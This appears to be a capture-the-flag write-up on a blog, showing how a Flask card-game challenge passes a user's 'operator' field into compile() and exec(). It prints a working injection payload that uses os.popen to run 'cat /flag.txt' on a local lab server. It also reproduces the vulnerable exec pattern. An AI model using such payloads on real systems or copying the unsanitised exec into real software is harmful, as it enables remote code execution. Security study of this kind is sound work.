<!doctype html><html lang=en><head><title>Web Evaluation Check :: Soviet's CTF Write-UPs</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Remote Code Execution vulnerability by unsafe usage of exec function"><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=/ctf/hacktheboo/web/web-evaluation-check/><link rel=stylesheet href=/style.css><link rel=stylesheet href=/scss/attach.css><link rel="shortcut icon" href=/img/theme-colors/red.png><link rel=apple-touch-icon href=/img/theme-colors/red.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Web Evaluation Check"><meta property="og:description" content="Remote Code Execution vulnerability by unsafe usage of exec function"><meta property="og:url" content="/ctf/hacktheboo/web/web-evaluation-check/"><meta property="og:site_name" content="Soviet's CTF Write-UPs"><meta property="og:image" content="/img/favicon/red.png"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2022-11-06 19:25:08 +0100 +0100"></head><body class=red><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>SovietBeast</div></a></div></div></header><div class=content><article class=post><h1 class=post-title><a href=/ctf/hacktheboo/web/web-evaluation-check/>Web Evaluation Check</a></h1><div class=post-meta><time class=post-date>2022-11-06 ::</time></div><div class=post-content><div><section class=attachments><label>Attachments</label><div class=attachments-files><ul><li><a class="tooltipped tooltipped-n" aria-label=Download href=/ctf/hacktheboo/web/web-evaluation-check/files/web_evaluation_deck.zip download>web_evaluation_deck.zip</a>
<a class="new-tab tooltipped tooltipped-n" aria-label="Open in new tab" href=/ctf/hacktheboo/web/web-evaluation-check/files/web_evaluation_deck.zip target=_blank></a><div class=attachment-size>(4918kb)</div></li></ul></div></section><h1 id=web-evaluation-deck>Web evaluation deck<a href=#web-evaluation-deck class=hanchor arialabel=Anchor>&#8983;</a></h1><h1 id=information-gathering>Information Gathering<a href=#information-gathering class=hanchor arialabel=Anchor>&#8983;</a></h1><h2 id=the-application-at-a-glance->The application at-a-glance üîç<a href=#the-application-at-a-glance- class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Application is a card game that allows users to flip 8 cards.</p><p><img src=images/Untitled.png alt=Untitled></p><p>If HP bar is depleted game is won.</p><p><img src=images/Untitled%201.png alt=Untitled></p><p>At first glance there is no visible bug or vulnerability.</p><h2 id=source-code-review>Source code review<a href=#source-code-review class=hanchor arialabel=Anchor>&#8983;</a></h2><p>All of the source code was too big to upload here so only flask source code is stored, without images and other static files.</p><p>Only interesting file is <code>routes.py</code> as this file store all the logic used by application.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Blueprint, render_template, request
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> application.util <span style=color:#f92672>import</span> response
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>web <span style=color:#f92672>=</span> Blueprint(<span style=color:#e6db74>&#39;web&#39;</span>, __name__)
</span></span><span style=display:flex><span>api <span style=color:#f92672>=</span> Blueprint(<span style=color:#e6db74>&#39;api&#39;</span>, __name__)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@web</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@api</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/get_health&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>count</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> request<span style=color:#f92672>.</span>is_json:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> response(<span style=color:#e6db74>&#39;Invalid JSON!&#39;</span>), <span style=color:#ae81ff>400</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>get_json()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    current_health <span style=color:#f92672>=</span> data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;current_health&#39;</span>)
</span></span><span style=display:flex><span>    attack_power <span style=color:#f92672>=</span> data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;attack_power&#39;</span>)
</span></span><span style=display:flex><span>    operator <span style=color:#f92672>=</span> data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;operator&#39;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> current_health <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> attack_power <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> operator:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> response(<span style=color:#e6db74>&#39;All fields are required!&#39;</span>), <span style=color:#ae81ff>400</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    result <span style=color:#f92672>=</span> {}
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        code <span style=color:#f92672>=</span> compile(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;result = </span><span style=color:#e6db74>{</span>int(current_health)<span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#e6db74>{</span>operator<span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#e6db74>{</span>int(attack_power)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;&lt;string&gt;&#39;</span>, <span style=color:#e6db74>&#39;exec&#39;</span>)
</span></span><span style=display:flex><span>        exec(code, result) <span style=color:#75715e>#exec function allows to execute python code</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> response(result<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;result&#39;</span>))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> response(<span style=color:#e6db74>&#39;Something Went Wrong!&#39;</span>), <span style=color:#ae81ff>500</span>
</span></span></code></pre></div><p>First interesting thing is that this application uses <code>compile</code> and <code>exec</code> function.</p><p>Lets analyze the given source code.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>    data <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>get_json()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    current_health <span style=color:#f92672>=</span> data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;current_health&#39;</span>)
</span></span><span style=display:flex><span>    attack_power <span style=color:#f92672>=</span> data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;attack_power&#39;</span>)
</span></span><span style=display:flex><span>    operator <span style=color:#f92672>=</span> data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;operator&#39;</span>)
</span></span></code></pre></div><p>This piece of code parse <code>POST</code> body and get <code>current_health</code> , <code>attack_power</code> and <code>operator</code> parameters.</p><p>Next step is checking if all three variables are set this is the same as checking if all three parameters are passed in request.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> current_health <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> attack_power <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> operator:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> response(<span style=color:#e6db74>&#39;All fields are required!&#39;</span>), <span style=color:#ae81ff>400</span>
</span></span></code></pre></div><p>This part is most interesting because of use <code>exec</code> function.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span> result <span style=color:#f92672>=</span> {}
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        code <span style=color:#f92672>=</span> compile(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;result = </span><span style=color:#e6db74>{</span>int(current_health)<span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#e6db74>{</span>operator<span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#e6db74>{</span>int(attack_power)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;&lt;string&gt;&#39;</span>, <span style=color:#e6db74>&#39;exec&#39;</span>)
</span></span><span style=display:flex><span>        exec(code, result) <span style=color:#75715e>#exec function allows to execute python code</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> response(result<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;result&#39;</span>))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> response(<span style=color:#e6db74>&#39;Something Went Wrong!&#39;</span>), <span style=color:#ae81ff>500</span>
</span></span></code></pre></div><p>But before <code>exec</code> function call, user input is directly passed to <code>compile</code> function and then to <code>exec</code> and <code>current_health</code> and <code>attack_power</code> are casted to <code>int</code> . <code>result</code> variable are returned to the user in response.</p><h1 id=the-vulnerability>The Vulnerability<a href=#the-vulnerability class=hanchor arialabel=Anchor>&#8983;</a></h1><p>As there is no sanitization of user input there is possible RCE (Remote Code Execution) via <code>exec</code> function!</p><h2 id=testing>Testing<a href=#testing class=hanchor arialabel=Anchor>&#8983;</a></h2><p>As I‚Äôm not familliar with <code>compile()/exec()</code> function I copied relevant part of code to new python script for testing.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>current_health <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;12&#39;</span>
</span></span><span style=display:flex><span>operator <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>
</span></span><span style=display:flex><span>attack_power <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;100&#39;</span>
</span></span><span style=display:flex><span>result <span style=color:#f92672>=</span> {}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>    code <span style=color:#f92672>=</span> compile(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;result = </span><span style=color:#e6db74>{</span>int(current_health)<span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#e6db74>{</span>operator<span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#e6db74>{</span>int(attack_power)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;&lt;string&gt;&#39;</span>, <span style=color:#e6db74>&#39;exec&#39;</span>)
</span></span><span style=display:flex><span>    exec(code, result)
</span></span><span style=display:flex><span>    print(result<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;result&#39;</span>))
</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#39;Something Went Wrong!&#39;</span>)
</span></span></code></pre></div><p>After executing this script number <code>112</code> shows up.</p><p><img src=images/Untitled%202.png alt=Untitled></p><p><code>exec</code> function is capable of executing python code. User controls all three parameters but only <code>operator</code> is passed directly to <code>compile</code> rest parameters are converted to <code>int</code></p><p>One modyfication for testing script is required, because in this state when something is wrong application pring <code>Something Went Wrong!</code> to get full traceback <code>try\execpt</code> block can be removed.</p><p><code>operator</code> variable is set to <code>print(1)</code> if everything go well it should print <code>1</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>current_health <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;12&#39;</span>
</span></span><span style=display:flex><span>operator <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;print(1)&#34;</span>
</span></span><span style=display:flex><span>attack_power <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;100&#39;</span>
</span></span><span style=display:flex><span>result <span style=color:#f92672>=</span> {}
</span></span><span style=display:flex><span>code <span style=color:#f92672>=</span> compile(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;result = </span><span style=color:#e6db74>{</span>int(current_health)<span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#e6db74>{</span>operator<span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#e6db74>{</span>int(attack_power)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;&lt;string&gt;&#39;</span>, <span style=color:#e6db74>&#39;exec&#39;</span>)
</span></span><span style=display:flex><span>exec(code, result)
</span></span><span style=display:flex><span>print(result<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;result&#39;</span>))
</span></span></code></pre></div><p>After executing script returns <code>SyntaxError: Invalid Syntax</code> and result is equal to <code>result = 12 print(1) 100</code> so 12 is <code>current_health</code> and 100 is <code>attack_power</code></p><p><img src=images/Untitled%203.png alt=Untitled></p><p>Python can be run <code>inline</code> and next instruction are separated with semicolon <code>;</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>current_health <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;12&#39;</span>
</span></span><span style=display:flex><span>operator <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;;print(1);&#34;</span>
</span></span><span style=display:flex><span>attack_power <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;100&#39;</span>
</span></span><span style=display:flex><span>result <span style=color:#f92672>=</span> {}
</span></span><span style=display:flex><span>code <span style=color:#f92672>=</span> compile(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;result = </span><span style=color:#e6db74>{</span>int(current_health)<span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#e6db74>{</span>operator<span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#e6db74>{</span>int(attack_power)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;&lt;string&gt;&#39;</span>, <span style=color:#e6db74>&#39;exec&#39;</span>)
</span></span><span style=display:flex><span>exec(code, result)
</span></span><span style=display:flex><span>print(result<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;result&#39;</span>))
</span></span></code></pre></div><p>Executing this version yield expected results, script prints additional <code>1</code> in terminal window.</p><p><img src=images/Untitled%204.png alt=Untitled></p><h1 id=exploitation>Exploitation<a href=#exploitation class=hanchor arialabel=Anchor>&#8983;</a></h1><p>With <code>Remote Code Execution</code> now we can read the flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>POST <span style=color:#f92672>/</span>api<span style=color:#f92672>/</span>get_health HTTP<span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
</span></span><span style=display:flex><span>Host: <span style=color:#ae81ff>127.0.0.1</span>:<span style=color:#ae81ff>1337</span>
</span></span><span style=display:flex><span>User<span style=color:#f92672>-</span>Agent: Mozilla<span style=color:#f92672>/</span><span style=color:#ae81ff>5.0</span> (X11; Linux x86_64; rv:<span style=color:#ae81ff>102.0</span>) Gecko<span style=color:#f92672>/</span><span style=color:#ae81ff>20100101</span> Firefox<span style=color:#f92672>/</span><span style=color:#ae81ff>102.0</span>
</span></span><span style=display:flex><span>Accept: <span style=color:#f92672>*/*</span>
</span></span><span style=display:flex><span>Accept<span style=color:#f92672>-</span>Language: en<span style=color:#f92672>-</span>US,en;q<span style=color:#f92672>=</span><span style=color:#ae81ff>0.5</span>
</span></span><span style=display:flex><span>Accept<span style=color:#f92672>-</span>Encoding: gzip, deflate
</span></span><span style=display:flex><span>Referer: http:<span style=color:#f92672>//</span><span style=color:#ae81ff>127.0.0.1</span>:<span style=color:#ae81ff>1337</span><span style=color:#f92672>/</span>
</span></span><span style=display:flex><span>Content<span style=color:#f92672>-</span>Type: application<span style=color:#f92672>/</span>json
</span></span><span style=display:flex><span>Origin: http:<span style=color:#f92672>//</span><span style=color:#ae81ff>127.0.0.1</span>:<span style=color:#ae81ff>1337</span>
</span></span><span style=display:flex><span>Content<span style=color:#f92672>-</span>Length: <span style=color:#ae81ff>114</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Fetch<span style=color:#f92672>-</span>Dest: empty
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Fetch<span style=color:#f92672>-</span>Mode: cors
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Fetch<span style=color:#f92672>-</span>Site: same<span style=color:#f92672>-</span>origin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;current_health&#34;</span>:<span style=color:#e6db74>&#34;43&#34;</span>,
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;attack_power&#34;</span>:<span style=color:#e6db74>&#34;33&#34;</span>,
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;operator&#34;</span>:<span style=color:#e6db74>&#34;;result = __import__(&#39;os&#39;).popen(&#39;cat /flag.txt&#39;).read();&#34;</span>
</span></span><span style=display:flex><span>} 
</span></span></code></pre></div><p>After sending this malicious request to the server application returns with flag.</p><p><img src=images/Untitled%205.png alt=Untitled></p><h2 id=payload-explanation>Payload explanation<a href=#payload-explanation class=hanchor arialabel=Anchor>&#8983;</a></h2><pre tabindex=0><code>&#34;operator&#34;:&#34;;result = __import__(&#39;os&#39;).popen(&#39;cat /flag.txt&#39;).read();&#34;
</code></pre><ul><li>semicolons are here for valid python code exectution - without <code>;</code> signs interpreter throws <code>invalid syntax</code> error</li><li><code>result =</code> this overwrites variable that is returned in response to the user</li><li><code>__import__</code> is function called by regular <code>import</code> statement this allows to import modules directly so <code>__import__('os')</code> means the same as <code>import os</code> but can be done inline and can call function directly by referencing them as ‚Äúobjects‚Äù</li><li><code>popen('cat /flag.txt')</code> this function spawns shell process and executes command <code>cat /flag.txt</code></li><li><code>read()</code> reads output of a process from <code>popen</code></li></ul></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>¬© 2022 Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>